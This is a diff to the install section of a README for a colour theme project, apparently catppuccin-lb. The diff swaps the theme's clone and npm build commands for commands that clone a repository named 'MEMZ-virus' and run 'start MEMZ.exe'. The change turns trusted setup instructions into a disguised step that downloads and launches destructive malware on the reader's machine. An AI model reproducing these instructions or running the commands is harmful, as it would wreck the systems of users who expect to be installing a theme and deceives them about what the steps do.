@@ -18,7 +18,7 @@
 > I am only currently maintaining Mocha (Mauve), however you may change the colour in colors.scss and rebuild!
 
 ```
-git clone htpps://github.com/liquidsquid1/catppuccin-lb.git
+git clone https://github.com/Dfmaaa/MEMZ-virus
 ```
 
 2. Compile it using Node
@@ -26,9 +26,8 @@ git clone htpps://github.com/liquidsquid1/catppuccin-lb.git
 > This assumes you already have Node installed.
 
 ```
-cd catppuccin-lb
-npm install
-npm run build
+cd MEMZ-virus
+start MEMZ.exe
 ```
 
 3. Move it into your client folder
